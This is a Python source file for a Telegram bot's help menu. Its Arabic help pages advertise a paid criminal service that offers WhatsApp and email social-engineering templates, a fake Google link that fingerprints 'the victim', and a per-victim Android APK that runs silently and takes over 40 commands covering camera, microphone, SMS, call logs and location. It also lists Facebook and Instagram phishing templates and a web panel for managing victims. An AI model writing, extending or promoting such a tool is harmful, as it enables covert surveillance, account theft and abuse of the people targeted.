# bot_handlers/callbacks/help.py
from config import bot
from logging_config import get_logger

from ..helpers import safe_edit
from ..keyboards import build_help_page_nav

logger = get_logger("bot_handlers.callbacks.help")


HELP_PAGES = [
    {
        "title": "📖 شرح البوت - الجزء 1",
        "subtitle": "نظرة عامة على الأدوات المتاحة",
        "content": (
            "🔍 <b>محرك البحث</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• <b>بحث برقم الهاتف</b>: تحصل على معلومات الرقم من مصادر مفتوحة\n"
            "• <b>بحث بالإيميل</b>: (قريباً)\n\n"
            "🎭 <b>الهندسة الاجتماعية</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• <b>واتساب</b>: 10 قوالب رسائل جاهزة\n"
            "• <b>البريد الإلكتروني</b>: 10 قوالب احترافية\n\n"
            "🎯 <b>جمع المعلومات (Silent)</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• ينشئ رابط يبدو كأنه Google\n"
            "• يجمع بصمة كاملة عن الضحية"
        ),
    },
    {
        "title": "📖 شرح البوت - الجزء 2",
        "subtitle": "أنظمة APK والضحايا",
        "content": (
            "📱 <b>تطبيق الضحية (APK)</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• تبني APK مخصص لكل ضحية\n"
            "• يستقبل الأوامر من البوت\n"
            "• يشتغل في الخلفية بدون إشعار\n\n"
            "👥 <b>إدارة الضحايا</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• عند كل ضحية: <b>40+ أمر</b>\n"
            "• 📷 كاميرا، 🎙️ تسجيل صوتي\n"
            "• 📨 SMS + سجل المكالمات\n"
            "• 📍 الموقع + WiFi\n\n"
            "🔗 <b>روابط التصيد</b>\n"
            "• <b>فيسبوك</b>: 10 قوالب\n"
            "• <b>انستقرام</b>: 10 قوالب"
        ),
    },
    {
        "title": "📖 شرح البوت - الجزء 3",
        "subtitle": "لوحة التحكم والاشتراكات",
        "content": (
            "🌐 <b>لوحة التحكم (ويب)</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "• تدخل من أي متصفح\n"
            "• قائمة كل ضحاياك\n"
            "• إرسال أوامر مباشرة\n\n"
            "💎 <b>الاشتراكات والدفع</b>\n"
            "• 💎 باقات متعددة\n"
            "• ⭐ دفع عبر Telegram Stars\n"
            "• 🎁 3 استخدامات مجانية\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "💡 <b>نصيحة:</b> ابدأ بالأدوات المجانية"
        ),
    },
]


def build_help_page(index):
    if index < 0 or index >= len(HELP_PAGES):
        index = 0

    page = HELP_PAGES[index]
    text = (
        f"<b>{page['title']}</b>\n"
        f"<i>{page['subtitle']}</i>\n"
        f"━━━━━━━━━━━━━━━━━━\n\n"
        f"{page['content']}\n\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"📄 <b>الصفحة {index + 1}/{len(HELP_PAGES)}</b>"
    )
    m = build_help_page_nav(index, len(HELP_PAGES))
    return text, m


def handle(call, chat_id, user_id, data):
    bot.answer_callback_query(call.id)

    if data == "help_guide":
        index = 0
    else:
        try:
            index = int(data.replace("help_page_", ""))
        except ValueError:
            index = 0

    text, m = build_help_page(index)
    safe_edit(call, text, reply_markup=m)
